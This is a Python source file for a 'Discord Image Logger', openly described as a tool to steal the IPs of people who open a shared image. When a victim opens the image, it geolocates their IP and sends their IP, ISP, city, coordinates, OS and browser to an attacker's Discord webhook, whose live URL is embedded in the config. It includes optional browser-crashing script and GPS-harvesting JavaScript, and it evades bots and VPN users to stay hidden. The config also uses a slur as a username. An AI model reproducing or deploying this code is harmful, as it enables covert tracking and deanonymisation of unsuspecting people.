# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1455052799493800151/u3ru2dK_58PLrguELCjX6h3H4Swf0xGbNxfJmgXoAaA9nqCPA0V0EJWrQobcA2SDa5nA",
    "image": "data:image/jpeg;base64,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.jpeg", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "RetardedSpeed67", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": false, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": false, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "Null", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
